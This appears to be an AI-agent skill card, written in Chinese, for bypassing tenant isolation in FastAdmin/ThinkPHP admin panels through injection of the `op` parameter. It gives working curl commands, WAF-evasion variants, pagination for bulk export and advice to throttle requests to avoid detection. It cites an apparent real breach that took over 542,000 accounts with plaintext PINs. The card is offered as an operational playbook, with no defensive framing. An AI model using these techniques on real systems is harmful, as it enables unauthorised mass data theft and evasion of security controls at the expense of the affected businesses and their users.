---
name: fastadmin-filter-op-tenant-bypass
description: >-
  Use when 目标跑 FastAdmin/ThinkPHP 多租户后台（/shop_hq/、/admin/ 前缀）：filter + op 参数未做
  运算符白名单，op=GT|NEQ|IN 把 shop_id 等值过滤改成范围过滤，跨商户全量导出。含 WAF 只拦 EXP 的绕法。
---

# FastAdmin `filter`/`op` 运算符注入 → 跨租户全量导出

实战来源：507 出海 TG 云控（2026-08，ThinkPHP5 + FastAdmin Shop），客服坐席权限导出 **542,071 条**账号（含明文 PIN）+ 全平台 tdata 会话文件。

## When to Use

- 后台 URL 形如 `/shop_hq/user/user?page=1&limit=10`、`/admin/xxx/index`
- 有自建 WAF 但只拦 `EXP`/`SQL` 关键字（提示「507安全系统」这类自定义页）
- 目标明确多租户（`shop_id`、`tenant_id`、`merchant_id`、`agent_id`）

## 根因

FastAdmin 的 `Backend::index()` 把 `filter` 与 `op` 两个 query 参数直接交给 ORM：

```php
$filter = json_decode($this->request->get("filter", ''), true);
$op     = json_decode($this->request->get("op", ''), true);
// → where($filter, $op)   // op 未做白名单
```

`op` 支持 `=`,`<>`,`>`,`>=`,`<`,`<=`,`LIKE`,`NOT LIKE`,`IN`,`NOT IN`,`RANGE`,`NULL`,`NOT NULL`,`GT`,`EGT`,`LT`,`ELT`。

租户隔离写成「强制 `shop_id = 当前商户`」，一旦 `op` 可控就变 `shop_id > 0`。

## 打法

```bash
# 基线（只看到自己商户）
curl -s 'https://目标/shop_hq/user/user?page=1&limit=10' -b cookie.txt | head -c 400

# 越界：shop_id=0 且 op=GT → 大于 0 的全部
curl -s 'https://目标/shop_hq/user/user?page=1&limit=100' \
  --data-urlencode 'filter={"shop_id":"0"}' \
  --data-urlencode 'op={"shop_id":"GT"}' -G -b cookie.txt | head -c 800
```

- 判据：返回记录里 `shop_id` 出现**非本商户**值
- 放大：`limit=500`（多数允许 500-1000），`page` 翻页；或直接打导出端点 `/shop_hq/user/export?...同参数`
- 字段级：再加 `filter={"id":"0"}&op={"id":"GT"}` 或 `sort=id desc` 提最新

## 变换（WAF 只认关键字时）

| 变体 | 说明 |
|---|---|
| `op={"shop_id":"NEQ"}` | 不等于，绕「必须等于」 |
| `op={"shop_id":"IN"}` + `filter={"shop_id":["1","2","3"]}` | 枚举商户 |
| `filter[shop_id]=0&op[shop_id]=GT` | 数组形式，部分版本同样生效 |
| `%7B%22shop_id%22%3A%220%22%7D` | JSON 编码，绕简单 WAF 规则 |
| `op={"shop_id":"RANGE"}` + `filter={"shop_id":["1","999999"]}` | 范围 |

- WAF 若拦 `GT` 关键字：换大小写 `gt`、加空格、用 `RANGE`/`NEQ`

## 判据门槛

- **L1**：`filter`/`op` 参数被接受（错误信息或行为变化）
- **L2**：返回条数明显超过本商户应有量
- **L3**：记录里出现其他商户的 `shop_id` + 敏感字段（明文密码/PIN/token）

## 坑

1. FastAdmin 某些版本对 `op` 做了白名单 → 只留 `=`/`LIKE`，此时改打 `sort`/`field` 注入
2. `limit` 通常封顶 1000，导出要按 `page` 循环
3. 自建 WAF 会按 UA/频率拦，翻页放慢到 1-2 req/s
4. 多租户隔离也可能在 SQL 视图/中间件层 → 先确认「自己只能看到自己」再打

## 相关卡

- `fastadmin-daifu-pentest` / `fastadmin-wanlshop-pentest` — FastAdmin 其它面
- `api-authz-idor-testing` — 同类越权系统化测试
- `waf-bypass-methodology` — 参数型 WAF 绕过
